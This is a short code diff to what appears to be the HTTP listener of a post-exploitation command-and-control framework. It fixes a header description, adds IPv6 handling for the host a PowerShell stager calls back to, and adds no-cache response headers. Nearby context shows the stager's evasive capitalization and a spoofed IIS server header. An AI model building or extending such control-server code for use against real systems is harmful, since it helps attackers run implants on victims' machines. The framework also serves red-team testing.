@@ -98,7 +98,7 @@ class Listener:
                 'Value'         :   ''
             },
             'ServerVersion' : {
-                'Description'   :   'TServer header for the control server.',
+                'Description'   :   'Server header for the control server.',
                 'Required'      :   True,
                 'Value'         :   'Microsoft-IIS/7.5'
             }
@@ -174,6 +174,17 @@ class Listener:
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 # TODO: reimplement stager retries?
+
+                #check if we're using IPv6
+                listenerOptions = copy.deepcopy(listenerOptions)
+                bindIP = listenerOptions['BindIP']['Value']
+                port = listenerOptions['Port']['Value']
+                if ':' in bindIP:
+                    if "http" in host:
+                        if "https" in host:
+                            host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
+                        else:
+                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port) 
 
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
@@ -460,6 +471,15 @@ class Listener:
         def change_header(response):
             "Modify the default server version in the response."
             response.headers['Server'] = listenerOptions['ServerVersion']['Value']
+            return response
+
+
+        @app.after_request
+        def add_proxy_headers(response):
+            "Add HTTP headers to avoid proxy caching."
+            response.headers['Cache-Control'] = "no-cache, no-store, must-revalidate"
+            response.headers['Pragma'] = "no-cache"
+            response.headers['Expires'] = "0"
             return response
 
 
